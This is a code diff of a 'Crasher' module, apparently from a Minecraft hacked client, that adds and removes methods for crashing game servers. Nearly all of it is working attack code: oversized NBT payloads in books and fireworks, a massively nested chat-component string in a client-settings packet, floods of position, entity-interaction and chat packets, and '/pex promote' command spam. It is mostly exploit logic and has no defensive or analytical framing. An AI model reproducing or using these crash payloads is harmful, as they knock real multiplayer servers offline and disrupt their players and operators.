-        if (TimeHelper.hasReached(10)) {
-
-            PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
-            packetbuffer.writeLong(Long.MAX_VALUE);
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
-        }
-
-    }
-
-    public void Creative() {
-        ItemStack itm = new ItemStack(Block.getBlockById(Integer.valueOf(1)));
-        NBTTagCompound base = new NBTTagCompound();
-        int i;
-        for (i = 0; i < 30000; i++)
-            base.setDouble(String.valueOf(i), Double.NaN);
-        itm.setTagCompound(base);
-        for (i = 0; i < 40; i++)
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(i, itm));
-       toggle();
-    }
-public static int Timer = 0;
-    public void Custompayload() {
-        if (TimeHelper.hasReached(1000)) {
-
-            for (int index = 0; index < 3333; ++index){
-                Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
-                        Minecraft.getMinecraft().thePlayer.posX + 9412 * index,
-                        Minecraft.getMinecraft().thePlayer.getEntityBoundingBox().minY + 9412 * index,
-                        Minecraft.getMinecraft().thePlayer.posZ + 9412 * index, true));
-            }
-            Timer++;
-                if (Timer == 3) {
-                    toggle();
-                }
-
-        }
-    }
-
-    public void CustomPlayload2() {
-        for (int j = 0; j < 10; ++j) {
-            NBTTagList bookPages;
-            bookPages = new NBTTagList();
-            for (int i = 0; i < 16300; ++i) {
-                bookPages.appendTag(new NBTTagString(""));
-            }
-            ItemStack bookObj = new ItemStack(Items.writable_book);
-            bookObj.setTagInfo("pages", bookPages);
-            PacketBuffer bufferbedit = new PacketBuffer(Unpooled.buffer());
-            bufferbedit.writeItemStackToBuffer(bookObj);
-            Minecraft.getMinecraft().thePlayer.sendQueue
-                    .addToSendQueue(new C17PacketCustomPayload("MC|BEdit", bufferbedit));
-            PacketBuffer bufferbsign = new PacketBuffer(Unpooled.buffer());
-            bookObj.setItem(Items.written_book);
-            bufferbsign.writeItemStackToBuffer(bookObj);
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BSign", bufferbsign));
-        }
-    }
-
-    public void Firework() {
-        try {
-            ItemStack firework = new ItemStack(Items.fireworks);
-            NBTTagCompound tagf = new NBTTagCompound();
-            NBTTagCompound tage = new NBTTagCompound();
-            NBTTagList list = new NBTTagList();
-            int[] i = new int[64];
-            for (int i2 = 0; i2 < 3260; i2++) {
-                Arrays.fill(i, i2 + 1);
-                NBTTagCompound tagx = new NBTTagCompound();
-                tagx.setIntArray("Colors", i);
-                list.appendTag(tagx);
-            }
-            tage.setTag("Explosions", list);
-            tage.setByte("Flight", (byte) 2);
-            tagf.setTag("Fireworks", tage);
-            firework.setTagCompound(tagf);
-            for (int i3 = 0; i3 < 100; ++i3) {
-            }
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, firework));
-        } catch (Exception ex) {
-
-        }
-        toggle();
-    }
-
-
-    public void Respawn() {
-
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C16PacketClientStatus(C16PacketClientStatus.EnumState.PERFORM_RESPAWN));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(Integer.MAX_VALUE));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C15PacketClientSettings("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}",
-                Integer.MAX_VALUE + 1, EntityPlayer.EnumChatVisibility.SYSTEM, false, Integer.MAX_VALUE + 1));
-    }
-
-    public void Item() {
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.carrot)));
-    }
-
-    public void Item2() {
-
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, new ItemStack(Items.diamond_sword)));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
-        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.wooden_sword)));
-    }
-
-    public void Labymod() {
-        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
-        buffer.writeString("God-Client");
-        Crasher.this.mc.getNetHandler().addToSendQueue((net.minecraft.network.Packet)new C17PacketCustomPayload("LABYMOD", buffer));
-    }
-
-    public void Laby2() {
-        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
-        packetBuffer.writeString("INFO");
-        JsonObject object = new JsonObject();
-        JsonObject ccpObject = new JsonObject();
-        ccpObject.addProperty("version", "Unknown parameter passed at @NotNull with en_US in ServerListPing.java");
-        object.add("ccp", (JsonElement)ccpObject);
-        packetBuffer.writeString(object.toString());
-        Crasher.this.mc.getNetHandler().addToSendQueue((net.minecraft.network.Packet)new C17PacketCustomPayload("LMC", packetBuffer));
-    }
-
-
-    public void Spam() {
-        for (int i = 0; i < 2000; i++) {
-            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((Packet) new C01PacketChatMessage((new Random()).toString()));
-        }
-        toggle();
-
-    }
-
-    public void Pex() {
-        Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C01PacketChatMessage("/pex promote a a"));
-        Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C01PacketChatMessage("/pex promote b b"));
-        toggle();
-    }
-
-    public void Position() {
-
-        Minecraft.getMinecraft().thePlayer.setPosition(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY + 0.3D, Minecraft.getMinecraft().thePlayer.posZ);
-        final double x = Minecraft.getMinecraft().thePlayer.posX;
-        final double y = Minecraft.getMinecraft().thePlayer.posY;
-        final double z = Minecraft.getMinecraft().thePlayer.posZ;
-
-        for (int i = 0; i < 3000; ++i) {
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999D, z, false));
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
-        }
-        Minecraft.getMinecraft().thePlayer.motionY = 0;
-
-    }
 
     public void Entity() {
         try {
 
 
-                if (Minecraft.getMinecraft().objectMouseOver.entityHit == null) {
-                    PlayerUtils.sendMessage("kuke Bitte auf ein Entity");
-                }
-                if (TimeHelper.hasReached(1000)) {
-                    if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
-                        for (int i = 0; i < 600; i++) {
-                            (Minecraft.getMinecraft().getNetHandler().getNetworkManager()).channel.writeAndFlush(new C02PacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit, C02PacketUseEntity.Action.INTERACT));
-                        }
-                        TimeHelper.reset();
-                }
-
+            if (Minecraft.getMinecraft().objectMouseOver.entityHit == null) {
+                PlayerUtils.sendMessage("kuke Bitte auf ein Entity");
+            }
+            if (TimeHelper.hasReached(1000)) {
+                if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
+                    for (int i = 0; i < 600; i++) {
+                        (Minecraft.getMinecraft().getNetHandler().getNetworkManager()).channel.writeAndFlush(new C02PacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit, C02PacketUseEntity.Action.INTERACT));
+                    }
+                    TimeHelper.reset();
                 }
 
+            }
 
 
         } catch (Throwable throwable) {
@@ -536,6 +486,34 @@ public static int Timer = 0;
     }
 
     public void Place() {
+        ItemStack book = null;
+
+        book = new ItemStack(Items.writable_book);
+
+        final NBTTagList list = new NBTTagList();
+        final NBTTagCompound tag = new NBTTagCompound();
+        final String author = mc.getSession().getUsername();
+        final String title = "Meta.exe";
+        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+        for (int i = 0; i < 50; ++i) {
+            final NBTTagString tString = new NBTTagString(size);
+            list.appendTag((NBTBase) tString);
+        }
+        tag.setString("author", author);
+        tag.setString("title", title);
+        tag.setTag("pages", (NBTBase) list);
+        book.setTagInfo("pages", (NBTBase) list);
+        book.setTagCompound(tag);
+        try {
+            for (int j = 0; j < 45; ++j) {
+                mc.thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY - 2.0, mc.thePlayer.posZ), 1, book, 0.0f, 0.0f, 0.0f));
+            }
+        } catch (Exception ex) {
+        }
+    }
+
+
+    public void MinePlex() {
         for (int c = 0; c < 30; ++c) {
             NBTTagCompound comp = new NBTTagCompound();
             NBTTagList list = new NBTTagList();
@@ -545,149 +523,18 @@ public static int Timer = 0;
             }
 
             comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
-            comp.setString("title", "onePlaceHandCrasherBookEdit");
+            comp.setString("title", "oneClickHardCrasherBookEdit");
             comp.setByte("resolved", (byte) 1);
             comp.setTag("pages", list);
             ItemStack stack = new ItemStack(Items.writable_book);
             stack.setTagCompound(comp);
             PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
             buffer.writeItemStackToBuffer(stack);
-            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0D, Minecraft.getMinecraft().thePlayer.posZ), 1, stack, 0.0F, 0.0F, 0.0F));
+            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
         }
+        toggle();
     }
-
-    public void newcrashb() {
-        try {
-            final ItemStack book = new ItemStack(Items.writable_book);
-            final String author = Minecraft.getMinecraft().getSession().getUsername();
-            final String title = "Play with me.";
-            final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-            final NBTTagCompound tag = new NBTTagCompound();
-            final NBTTagList list = new NBTTagList();
-            for (int i2 = 0; i2 < 16; ++i2) {
